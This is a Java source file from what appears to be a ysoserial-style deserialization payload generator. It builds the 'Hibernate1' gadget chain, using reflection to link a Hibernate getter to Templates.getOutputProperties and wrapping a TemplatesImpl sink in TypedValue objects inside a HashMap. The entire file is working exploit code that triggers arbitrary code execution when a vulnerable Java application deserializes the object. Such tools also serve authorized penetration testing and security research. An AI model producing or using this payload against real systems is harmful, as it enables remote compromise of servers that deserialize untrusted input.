package com.ppp.chain.hibernate;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import org.hibernate.EntityMode;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;

import javax.xml.transform.Templates;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * org.hibernate.property.access.spi.GetterMethodImpl.get()
 * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
 * org.hibernate.type.ComponentType.getPropertyValue(C)
 * org.hibernate.type.ComponentType.getHashCode()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.internal.util.ValueHolder.getValue()
 * org.hibernate.engine.spi.TypedValue.hashCode()
 * <p>
 * <p>
 * Requires:
 * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
 *
 * @author mbechler
 */
@Dependencies({"org.hibernate:hibernate-core"})
@Authors({Authors.MBECHLER})
@Sink({Sink.TemplatesImpl})
public class Hibernate1 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Hibernate1.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        Object getters = makeGetter(Templates.class, "getOutputProperties");
        return makeCaller(templates, getters);
    }

    public static Object makeGetter(Class<?> tplClass, String method) throws Exception {
        if (System.getProperty("hibernate5") != null) {
            return makeHibernate5Getter(tplClass, method);
        }
        return makeHibernate4Getter(tplClass, method);
    }

    public static Object makeHibernate4Getter(Class<?> tplClass, String method) throws Exception {
        Class<?> getterIf = Class.forName("org.hibernate.property.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor<?> bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
        Reflections.setAccessible(bgCon);

        if (!method.startsWith("get")) {
            throw new IllegalArgumentException("Hibernate4 can only call getters");
        }

        String propName = Character.toLowerCase(method.charAt(3)) + method.substring(4);

        Object g = bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }


    public static Object makeHibernate5Getter(Class<?> tplClass, String method) throws Exception {
        Class<?> getterIf = Class.forName("org.hibernate.property.access.spi.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor<?> bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);
        Object g = bgCon.newInstance(tplClass, "test", tplClass.getDeclaredMethod(method));
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }

    static Object makeCaller(Object tpl, Object getters) throws Exception {
        if (System.getProperty("hibernate3") != null) {
            return makeHibernate3Caller(tpl, getters);
        }
        return makeHibernate45Caller(tpl, getters);
    }


    static Object makeHibernate45Caller(Object tpl, Object getters) throws Exception {
        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

        ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        Reflections.setFieldValue(t, "componentTuplizer", tup);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new org.hibernate.type.Type[]{
                t
        });

        TypedValue v1 = new TypedValue(t, null);
        Reflections.setFieldValue(v1, "value", tpl);
        Reflections.setFieldValue(v1, "type", t);

        TypedValue v2 = new TypedValue(t, null);
        Reflections.setFieldValue(v2, "value", tpl);
        Reflections.setFieldValue(v2, "type", t);

        return KickOff.makeMap(v1, v2);
    }


    static Object makeHibernate3Caller(Object tpl, Object getters) throws Exception {
        // Load at runtime to avoid dependency conflicts
        Class entityEntityModeToTuplizerMappingClass = Class.forName("org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping");
        Class entityModeToTuplizerMappingClass = Class.forName("org.hibernate.tuple.EntityModeToTuplizerMapping");
        Class typedValueClass = Class.forName("org.hibernate.engine.TypedValue");

        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);
        Reflections.getField(AbstractComponentTuplizer.class, "propertySpan").set(tup, 1);

        ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        HashMap hm = new HashMap();
        hm.put(EntityMode.POJO, tup);
        Object emtm = Reflections.createWithConstructor(entityEntityModeToTuplizerMappingClass, entityModeToTuplizerMappingClass, new Class[]{Map.class}, new Object[]{hm});
        Reflections.setFieldValue(t, "tuplizerMapping", emtm);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new org.hibernate.type.Type[]{
                t
        });

        Constructor<?> typedValueConstructor = typedValueClass.getDeclaredConstructor(Type.class, Object.class, EntityMode.class);
        Object v1 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
        Reflections.setFieldValue(v1, "value", tpl);
        Reflections.setFieldValue(v1, "type", t);

        Object v2 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
        Reflections.setFieldValue(v2, "value", tpl);
        Reflections.setFieldValue(v2, "type", t);

        return KickOff.makeMap(v1, v2);
    }
}
